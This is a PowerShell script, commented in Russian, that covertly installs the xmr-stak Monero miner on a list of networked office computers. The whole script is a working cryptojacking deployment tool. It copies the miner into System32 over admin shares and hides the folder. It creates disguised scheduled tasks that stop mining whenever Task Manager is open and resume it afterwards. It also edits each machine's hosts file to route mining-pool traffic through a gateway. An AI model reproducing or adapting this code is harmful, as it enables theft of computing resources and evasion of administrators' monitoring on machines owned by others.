# # # # # #   НУЖНО ИЗМЕНИТЬ         # # # # # # # # # # 

# Задаём имена основных каталогов и файлов
$Owner = "serg" # Префикс для конфиг-файла
$NetPath = "\\geops.local\admin\Startsoft\"

$MinerName = "xmr-stak-win64" # Имя папки с файлами майнера
$ExecFile = "xmr-stak.exe" # Исполняемый файл майнера

$OwnerPath = $NetPath + $MinerName + "\_" + $Owner # каталог с файлами настроек владельца
$source = $NetPath + $MinerName # Полный путь к каталогу с файлами майнера

$dest = "\c$\Windows\System32\" # Конечный путь на удалённом компьютере (куда копируем папку)
$Gate = "192.168.17.18" # IP-Address компьютера, осуществляющего маскарадинг (шлюзовый комьютер)
$CompList = $OwnerPath + "\computers.txt" # файл со списком компьютеров для указанного владельца

$TasksDir = $OwnerPath + "\tasks\" # Путь к каталогу с xml-файлами заданий
$TaskRoot = "\Microsoft\Windows\Shell" # Префикс для создания имени и пути задания в TaskScheduler-e

# Создаем редактируемый список имен хостов
[System.Collections.ArrayList] $Pools = @(
"pool.supportxmr.com",
"pool.monero.hashvault.pro"
)


# Список файлов и папок, исключённые из копирования (при необходимости добавить имена файлов)
$ExcludeFiles = 
"scripts",
"_serg",
"_mick"


# Массив.Список готовых файлов для планировщика заданий
# Где ключ - будет имя задания, а значение - имя файла c заданием
$tasks = @{
"CPU_FULL" = "cpu_full.xml"
"CPU_HALF" = "cpu_half.xml"
"CloseAtStartTaskMan" = "CloseAtStartTaskMan.xml"
"StartAtCloseTaskMan" = "StartAtCloseTaskMan.xml"
}
$RunTaskName = "CPU_HALF" # имя задания, которое будет запускаться после развёртывания


$OnlineComps = @() # Доступные компьютеры
$OfflineComps = @() # Выключенные компьютеры

# Проверим доступность файла с названием монеты
$coin_file = $OwnerPath+"\coin.txt" 
if (!(Test-Path -Path $coin_file)){
   Write-Host 'Не найден файл ' $coin_file -ForegroundColor Red
   Write-Host 'Остановка программы'
   Pause
   Exit 
}

# Укажем действие по умолчанию "Развернуть"
$Action = @("DeployAction", "RemoveAction") 
$defaultAction = $Action[0]


#################################################
#                                               #                               
#           Блок функций                        #
#                                               #
#################################################



# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
# функция добавления задания в планировщик

function TaskAdd {
param ($CompName)
    
    CleanTasks $CompName # Очистим все задания в указанно папке $TaskRoot
    
    $tasks.Keys | ForEach-Object {
        
        $TaskFile = $TasksDir + $tasks[$_] # Имя файла задания
        $AddTaskName =  "`"$($TaskRoot + "\" + $_)`""  # Название задания в планировщике
        $StartTaskName = "`"$($TaskRoot + "\" + $RunTaskName)`""
               

      # Создаем наборы аттрибутов для консольного планировщика, на удаление задания, его создание и запуск
        $attrToAdd = ("/create", "/xml", "`"$TaskFile`"", "/s", "$compName", "/tn", $AddTaskName)
        $attrToRun = "/run", "/i", "/s", $comp, "/tn", $StartTaskName

        if (Test-Path $TaskFile){

            # Запускаем процесс создания задания на удаленном компьютере
                Start-Process "schtasks" -ArgumentList $attrToAdd -Wait -WindowStyle Hidden
                
        } else {
                Write-Host "Не найден файл задания: " $TaskFile -ForegroundColor Red
                pause
        }  
    }

   # Запускаем задание на выполнение
      Start-Process "schtasks" -ArgumentList $attrToRun -Wait -WindowStyle Hidden
      Write-Host $compName " - задание " $TaskRoot\$RunTaskName " запущено" -ForegroundColor Green
}



# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
# удаляем ВСЕ задания в планировщике по указанному пути $TaskRoot 

function CleanTasks {
param($CompName)

    $sch = New-Object -ComObject Schedule.Service
    $sch.Connect($CompName)
    $taskFolder = $sch.GetFolder($TaskRoot)
    
    #$taskFolder.GetTasks(1) | foreach {$_.Name} # вывести список заданий в указанной папке

    $taskFolder.GetTasks(1) | foreach{$taskFolder.DeleteTask($_.Name,0)}
    
    Write-Host $CompName " - Все задания в " $TaskRoot  " удалены" -ForegroundColor Green
    return
}



# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
# Проверка доступности компьютера

function Get-Status{
param($comp)

    if ( Test-Connection -ComputerName $comp -Count 2 -Quiet -ErrorAction Stop ) {
        Write-Host 'Компьютер ' $comp ' доступен'
        return $true
    } else {
        Write-Host 'Компьютер ' $comp ' ------- НЕдоступен ---------' -ForegroundColor Red
            return $false
    }
}   



# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
# Копируем нужные файлы в нужное место и делаем конечную папку скрытой

function CopyFolder{
param($CompName)
    $destFolder = "\\" + $CompName + $dest
    $MinerFolder = $destFolder + $MinerName

    Get-ChildItem $source -Exclude $ExcludeFiles | Copy-Item -Destination $MinerFolder -Force
    Copy-Item ($source + "\cpu\") -Destination ($MinerFolder) -Recurse -Force
    
    $ConfigFile = getPoollPath

    # Заменим имя воркера вместо %WORKER%
    $NewConfig = ReplaceWorker $ConfigFile $CompName

    # Запишем конфиг на удалённую машину
    Set-Content -Path ($MinerFolder + "\pools.txt") -Value $NewConfig -Force -Confirm:$false
        
    # Ставим атрибут "Скрытый" (Hidden) на конечную папку    
    (Get-Item $MinerFolder -Force).Attributes = "Hidden"
}




# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
# Меняем имя воркера %WORKER% на имя компьютера в конфиг-файле $config

function ReplaceWorker {
param ($config, $worker)

    $res = Get-Content $config | ForEach-Object { $_ -replace '%WORKER%', $worker }

    return $res
}




# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
# Получаем сисок компьютеров из файла

function Get-Comps{
param($list)
    $pattern = "[G-g][E-e][O-o]-[0-9]+"
    $ClearCompList = ""
    $ClearCompList = Get-Content -Path $list | where { $_ -match $pattern } | Get-Unique
    return $ClearCompList
}




# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
# Изменяем hosts файл

function AddToHosts {
param ($CompName)   

    $file = "\Windows\System32\drivers\etc\hosts"
    $PathToHosts = "\\" + $CompName + "\c$" + $file
    $Content = Get-Content $PathToHosts
    $Names = $Pools.Clone()
    
    # Пробегаем по содержимому файла, сравниваем построчно с набором массива, в случае совпадения
    # заменяем содержимое найденной строки соответствующим содержимым массива и удаляем из него
    # найденый элемент

    for($counter=0; $counter -lt $Content.Count; $counter++){

    
        for($i=0; $i -lt $Names.Count; $i++){

            if ([regex]::IsMatch($Content[$counter], $Names[$i])){

                $Content[$counter] = $Gate + "      " + $Names[$i];
                $Names.RemoveAt($i);
                break;        
            }
        }
    }

    # Добавляем в конец содержимого файла значения массива, не совпавшие ни с одной строкой
    # при поиске
    foreach($site in $Names){
        $Content += $Gate + "      " + $site;
    }
        
    # Записываем полученное содержимое обратно в файл
    
    Set-Content $PathToHosts $Content -Force 
}



# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
# Удаляем из hosts добавленные записи

function RemoveFromHost {
param ($CompName)   

    $file = "\Windows\System32\drivers\etc\hosts"
    $PathToHosts = "\\" + $CompName + "\c$" + $file

    #$file = "c:\Windows\System32\drivers\etc\hosts"
    #$PathToHosts = "D:\hosts"

    [System.Collections.ArrayList] $hostContent = Get-Content $PathToHosts
    
    # Пробегаем по содержимому файла $hostContent, сравниваем построчно с набором массива $Pools, в случае совпадения
    # удаляем из него найденый элемент
    for($counter=0; $counter -lt $hostContent.Count; $counter++){

        for($i=0; $i -lt $Pools.Count; $i++){

            if ([regex]::IsMatch($hostContent[$counter], $Pools[$i])){

                  $hostContent.RemoveAt($counter) 
                           
            }        
        }   
    }
        
    # Записываем полученное содержимое обратно в файл    
    Set-Content $PathToHosts $hostContent -Force 
}


# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
#  Убиваем процесс на удалённой машине

function KillRemoteProcess{
param ($compName, $procName)

    if ($procName -eq $null){
        $procName = $ExecFile.Clone()
    }
    
    filter xmrStak {if($_.Name -like $procName) {$_.Terminate()} }

    Get-WmiObject -ClassName Win32_Process -ComputerName $compName | xmrStak >null

}




# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
#  Получаем путь к файлу с пулами для монеты, указанной в файле coin.txt

function getPoollPath{
    $coinName = Get-Content -TotalCount 1 -Path $coin_file
    $poolPath = $OwnerPath+"`\coins`\" + $coinName + ".txt"

    if(Test-Path -Path $poolPath){
        return $poolPath
    } else {
        return $false
    }
}




#################################################
#                                               #                               
#           Основной блок команд                #
#                                               #
#################################################




# проверим доступность файла со списком компьютеров и очистим от дублей и неверных записей
if (Test-Path $CompList){
    $ClearCompList = Get-Comps $CompList
} else {
    Write-Host "Файл " + $CompList + " со списком компьютеров недоступен"
    pause
}


# Если в параметрах указано действие по умолчанию как Удаление
# Проверяем по списку доступность компьютеров
# Убиваем процесс и удаляем записи из hosts
# Удаляем задания из планировщика
if ($defaultAction -eq $Action[1])
{
    foreach ($comp in $ClearCompList) {
    if ((Get-Status $comp) -eq $true){
        $OnlineComps += $comp
        KillRemoteProcess $comp
        RemoveFromHost $comp 
        CleanTasks $comp       
    } else {
        $OfflineComps += $comp
    }    
}
}

# Проверяем доступность каждого компьютера по списку,запускаем копирование и меняем файл hosts
foreach ($comp in $ClearCompList) {
    if ((Get-Status $comp) -eq $true){
        $OnlineComps += $comp
        KillRemoteProcess $comp
        CopyFolder $comp 
        AddToHosts $comp
        TaskAdd $comp
    } else {
        $OfflineComps += $comp
    }    
}




Write-Host '
Всего компьютеров - ' $ClearCompList.Count ' 
Доступно компьютеров: ' $OnlineComps.Count ' штук
Недоступные компьютеры: ' $OfflineComps.Count ' штук'
$OfflineComps

